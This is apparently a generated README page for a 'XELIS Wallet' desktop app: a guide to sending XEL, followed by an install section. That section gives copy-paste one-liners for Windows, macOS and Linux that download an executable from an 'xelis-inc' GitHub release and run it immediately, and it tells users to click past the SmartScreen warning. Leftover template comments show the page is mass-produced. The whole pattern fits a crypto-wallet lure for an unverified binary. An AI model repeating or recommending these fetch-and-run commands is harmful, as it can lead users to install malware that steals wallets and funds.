![Send XEL with XELIS Wallet: address, fee and confirmation](assets/banner-article.png)
# Send XEL with XELIS Wallet: address, fee and confirmation

Enter the address, set the fee, review, then confirm in history.

## Downloads - Send

<p align="center"><a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`xelis-wallet-desktop-v0.2.1-Windows.exe`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`xelis-wallet-desktop-v0.2.1-Macos.dmg`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`xelis-wallet-desktop-v0.2.1-Linux.zip`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip) |

Sending needs a wallet that is synced and funded, so start from the [current XELIS Wallet release](https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1) if the app on your machine is older than the release page.

> A transaction cannot be cancelled once it is broadcast. The confirmation step is the last point where a wrong address can still be corrected.

To send XEL, open the wallet, choose send, paste the recipient address, enter the amount, review the fee, and confirm. The transaction appears in history immediately as pending and moves to confirmed once a block includes it. Check the first characters and the last characters of the address before you confirm, because a paste error sends funds to an address nobody controls.

<!-- ARTICLE-BODY-BEGIN -->
## What a send needs before you start

Run the <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1">current XELIS Wallet release</a> before a send you care about. The wallet must be synced, hold enough XEL for the amount plus the fee, and know the recipient's address. A wallet that is still syncing can build a transaction on stale state, which is the most common reason a send looks wrong afterwards.

Addresses are long strings, and they carry no checksum you can eyeball. That makes the paste itself the risk, not the network. The structure of a XELIS address and what its parts mean is covered in <a href="https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-address-format-integrated.md">XELIS Wallet address formats</a>.

## Send XEL step by step

1. Confirm the wallet is synced and shows the balance you expect.
2. Copy the recipient address from the source the recipient gave you, not from an old chat you cannot verify.
3. Open the send view and paste the address; compare the beginning and end with the original.
4. Enter the amount in XEL and read it back before continuing.
5. Review the fee and raise it if the wallet shows a low estimate.
6. Confirm, then open history and note the transaction identifier.

If the app warns that the address is invalid, do not retry with an edited address. Ask the recipient for it again; a single altered character produces a different, valid-looking address.

## Set a fee that will actually be included

The fee is chosen at send time and paid to the network, not to the wallet. Too low and the transaction sits pending; raising it before broadcast is easy, raising it afterwards is not, because a broadcast transaction cannot be re-priced. <a href="https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-fees-too-low.md">How XELIS Wallet fees work</a> explains what the setting does and when the default is enough.

## Confirm the payment landed

History shows the transaction as pending first, then confirmed. A pending entry means the network has the transaction but no block has included it yet. Confirmation follows once a block does, and the wallet updates the state without any action from you.

If it stays pending, the recovery options are in <a href="https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-transaction-stuck-pending.md">XELIS Wallet transaction stuck pending</a>, starting with confirming that the first transaction is genuinely not confirming.

## FAQ

### How long does a XEL transfer take?

With a normal fee it confirms within a few blocks; the wallet shows pending until then. If it is still pending after that, treat it as a fee problem rather than a network failure.

### Can I cancel a send after confirming it?

No. Once broadcast, the transaction is in the network's hands. You can only wait, or in some cases replace it with a higher fee from the same wallet.

### What happens if I paste the wrong address?

The funds go to that address, and nobody can reverse it. That is why the address is compared character by character before confirming.

### Do I need to be online to send?

Yes. The wallet needs a node connection to read the balance and broadcast the transaction.

### Is the fee taken from the amount?

No. The fee is charged on top of the amount, so the wallet needs enough for both.

<!-- ARTICLE-BODY-END -->

## How to install XELIS Wallet

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). Commands, verify commands, sizes and hashes come from install_commands.generate (A9-A11); drop the size in brackets when unknown. -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe">xelis-wallet-desktop-v0.2.1-Windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Verify the download (77.6 MB): run the command below and compare the result with SHA-256 `56dc416e2f85cad18496f2be3c1f909df4b0eca610341fa17ba6273335ae7c09`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`certutil -hashfile xelis-wallet-desktop-v0.2.1-Windows.exe SHA256`

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg">xelis-wallet-desktop-v0.2.1-Macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Verify the download (62.7 MB): run the command below and compare the result with SHA-256 `f5b8a49c6631aea6000022f763dea8694ef67fb18cfffafe1d4f241c63dea352`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`shasum -a 256 xelis-wallet-desktop-v0.2.1-Macos.dmg`

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip && unzip -oq app.zip -d w && B=$(find w -name '*xelis*wallet*' -type f|head -1) && chmod +x "$B" && "$B"
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip">xelis-wallet-desktop-v0.2.1-Linux.zip</a>.
2. Extract the archive: `unzip app.zip`.
3. Make the extracted wallet binary executable: `chmod +x <file>`.
4. Run it: `./xelis-wallet`.

Verify the download (21.5 MB): run the command below and compare the result with SHA-256 `43d91980869fe4bfb912467448c8354b542e9e240f01026225c173a75a9ca907`. The archive also carries a `.sha256` file; compare the extracted binary against that value too.

`sha256sum xelis-wallet-desktop-v0.2.1-Linux.zip`

<!-- INSTALL-END -->

## Related guides
- [How XELIS Wallet fees work](https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-fees-too-low.md)
- [XELIS Wallet address formats](https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-address-format-integrated.md)
- [XELIS Wallet transaction stuck pending](https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-transaction-stuck-pending.md)
- [Receive XEL in XELIS Wallet](https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-receive-address-qr-code.md)
- [Current XELIS Wallet release](https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1)
